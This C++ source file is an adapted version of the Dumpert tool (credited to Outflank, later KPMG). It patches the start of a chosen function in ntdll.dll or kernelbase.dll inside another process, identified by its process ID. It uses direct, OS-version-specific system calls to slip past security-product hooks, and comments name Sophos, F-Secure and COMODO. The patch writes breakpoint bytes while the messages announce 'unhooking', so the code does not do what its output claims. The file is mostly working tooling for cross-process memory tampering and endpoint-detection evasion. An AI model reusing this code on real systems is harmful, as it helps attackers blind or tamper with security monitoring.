#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include "Dumpert.h"
#include <DbgHelp.h>
#include <string>
#include <algorithm>

#pragma comment (lib, "Dbghelp.lib")

std::string capitalizeString(std::string s)
{
	transform(s.begin(), s.end(), s.begin(),
		[](unsigned char c) { return toupper(c); });
	return s;
}

BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo,LPCWSTR dllName, LPCSTR functionName) {

	BYTE AssemblyBytesToUse[] = { 0,0,0,0,0,0,0,0,0,0 };

	SIZE_T length = -1;
	if ((wcscmp(dllName, L"kernelbase.dll")==0) && (lstrcmpA(functionName, "CreateRemoteThreadEx") == 0))
	{
		//BRS: CreateRemoteThreadEx (F-secure)
		BYTE Bytes[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
		length = sizeof(Bytes);
		memcpy(AssemblyBytesToUse, Bytes, sizeof(Bytes));
	}
	else
	{
		if ((wcscmp(dllName, L"ntdll.dll") == 0) && (lstrcmpA(functionName, "ZwCreateFile") == 0))
		{
			//BRS: edr.dll test on ntdll.dll
			BYTE Bytes[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0xCC,0xCC,0xCC };
			length = sizeof(Bytes);
			memcpy(AssemblyBytesToUse, Bytes, sizeof(Bytes));
		}
		else
		{
			if ((wcscmp(dllName, L"ntdll.dll") == 0) && (lstrcmpA(functionName, "NtMapViewOfSection") == 0))
			{
				//Sophos
				BYTE Bytes[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
				length = sizeof(Bytes);
				memcpy(AssemblyBytesToUse, Bytes, sizeof(Bytes));
			}
			else
			{
				if ((wcscmp(dllName, L"kernelbase.dll") == 0) && (lstrcmpA(functionName, "CopyFileExW") == 0))
				{
					//COMODO
					BYTE Bytes[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
					length = sizeof(Bytes);
					memcpy(AssemblyBytesToUse, Bytes, sizeof(Bytes));
				}
				else
				{
					printf("ERROR: Bytes to restore supplied function of supplied DLL not known!");
					exit(-1);
				}
			}
		}
			
	}
	
	
	//BRS: original PoC
	//BYTE AssemblyBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0xFF};
	
	//BRS: edr.dll test on ntdll.dll
	//BYTE AssemblyBytes[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF,0x00,0x00,0x00 };
	
	//BRS: CreateRemoteThreadEx (F-secure)
	//BYTE AssemblyBytes[] = { 0x4C, 0x8B, 0xDC, 0x53, 0x56 };
	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		//AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		//AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		//AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		//AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
	}
	else {
		return FALSE;
	}

	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(dllName), pWinVerInfo->lpApiCall);

	printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
	//printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
	printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);
	
	LPVOID lpBaseAddress = lpProcAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = 10; //Enough bytes

	//BRS: added, set process by id:
	int processId = (int)pWinVerInfo->hTargetPID;

	//TODO: replace by syscall instead of OpenProcess
	HANDLE processHandle = OpenProcess(SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, FALSE, processId);

	NTSTATUS status = ZwProtectVirtualMemory(processHandle, &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		return FALSE;
	}
	//T
	status = ZwWriteVirtualMemory(processHandle, lpProcAddress, (PVOID)AssemblyBytesToUse, length, NULL);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
		return FALSE;
	}

	status = ZwProtectVirtualMemory(processHandle, &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		return FALSE;
	}

	return TRUE;
}

BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
	pWinVerInfo->hTargetPID = NULL;

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation10;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation7SP1;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
		NtFreeVirtualMemory = &NtFreeVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation80;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory80;
		NtFreeVirtualMemory = &NtFreeVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation81;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
		NtFreeVirtualMemory = &NtFreeVirtualMemory81;
	}
	else {
		return FALSE;
	}

	return TRUE;
}

//BOOL IsElevated() {
//	BOOL fRet = FALSE;
//	HANDLE hToken = NULL;
//	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
//		TOKEN_ELEVATION Elevation = { 0 };
//		DWORD cbSize = sizeof(TOKEN_ELEVATION);
//		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
//			fRet = Elevation.TokenIsElevated;
//		}
//	}
//	if (hToken) {
//		CloseHandle(hToken);
//	}
//	return fRet;
//}
//
//BOOL SetDebugPrivilege() {
//	HANDLE hToken = NULL;
//	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
//
//	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
//		return FALSE;
//	}
//
//	TokenPrivileges.PrivilegeCount = 1;
//	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
//
//	LPWSTR lpwPriv = L"SeDebugPrivilege";
//	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
//		CloseHandle(hToken);
//		return FALSE;
//	}
//
//	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
//		CloseHandle(hToken);
//		return FALSE;
//	}
//
//	CloseHandle(hToken);
//	return TRUE;
//}


int wmain(int argc, wchar_t* argv[]) {
		
	if (argc != 4)
	{
		printf("Supply pid, dll and function as argument. \n");
		return -1;
	}

	int pid = _wtoi(argv[1]);
	printf("Target pid: %d\n", pid);

	std::wstring wDll(argv[2]); //convert to wstring
	std::string sDll(wDll.begin(), wDll.end()); //and convert to string.
	LPCWSTR dllName = wDll.c_str();

	std::wstring wMethod(argv[3]); //convert to wstring
	std::string sMethod(wMethod.begin(), wMethod.end()); //and convert to string.
	LPCSTR functionName = (LPCSTR)sMethod.c_str();

//	LPCSTR functionName = "CreateRemoteThreadEx";
//	LPCWSTR dllName = L"kernelbase.dll";


	wprintf(L" ________          __    _____.__                 __				\n");
	wprintf(L" \\_____  \\  __ ___/  |__/ ____\\  | _____    ____ |  | __		\n");
	wprintf(L"  /   |   \\|  |  \\   __\\   __\\|  | \\__  \\  /    \\|  |/ /	\n");
	wprintf(L" /    |    \\  |  /|  |  |  |  |  |__/ __ \\|   |  \\    <		\n");
	wprintf(L" \\_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \\		\n");
	wprintf(L"         \\/                             \\/     \\/     \\/		\n");
	wprintf(L"                                  Dumpert							\n");
	wprintf(L"                               By Cneeliz @Outflank 2019		    \n");
	wprintf(L"               Heavily adapted By Tom @KPMG 2021	        	    \n\n");

	if (sizeof(LPVOID) != 8) {
		wprintf(L"[!] Sorry, this tool only works on a x64 version of Windows.\n");
		exit(1);
	}

	//SetDebugPrivilege();

	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));

	// First set OS Version/Architecture specific values
	OSVERSIONINFOEXW osInfo;
	LPWSTR lpOSVersion;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		return FALSE;
	}

	wprintf(L"[1] Checking OS version details:\n");
	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

	// Now create os/build specific syscall function pointers.
	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = L"10 or Server 2016";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess10;
		NtCreateFile = &NtCreateFile10;
		ZwClose = &ZwClose10;

		//BRS added: do not overwrite bytes
// 
		//pWinVerInfo->SystemCall = 0x56; //No syscall, but the right byte :)
		
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
		lpOSVersion = L"7 SP1 or Server 2008 R2";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess7SP1;
		NtCreateFile = &NtCreateFile7SP1;
		ZwClose = &ZwClose7SP1;
		pWinVerInfo->SystemCall = 0x3C;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		lpOSVersion = L"8 or Server 2012";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess80;
		NtCreateFile = &NtCreateFile80;
		ZwClose = &ZwClose80;
		pWinVerInfo->SystemCall = 0x3D;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		lpOSVersion = L"8.1 or Server 2012 R2";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess81;
		NtCreateFile = &NtCreateFile81;
		ZwClose = &ZwClose81;
		pWinVerInfo->SystemCall = 0x3E;
	}
	else {
		wprintf(L"	[!] OS Version not supported.\n\n");
		exit(1);
	}

	wprintf(L"[2] Checking Process details:\n");

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	if (!GetPID(pWinVerInfo)) {
		wprintf(L"	[!] Enumerating process failed.\n");
		exit(1);
	}

	//BRS: use inputed PID
	pWinVerInfo->hTargetPID = (HANDLE)(ULONG64)pid;


	wprintf(L"	[+] Process ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
	pWinVerInfo->lpApiCall = functionName;
	
	if (!Unhook_NativeAPI(pWinVerInfo, dllName,functionName)) {
		printf("	[!] Unhooking %s failed.\n", pWinVerInfo->lpApiCall);
		exit(1);
	}
	printf("	[!] Unhooking %s finished!\n", pWinVerInfo->lpApiCall);
	
	return 0;
}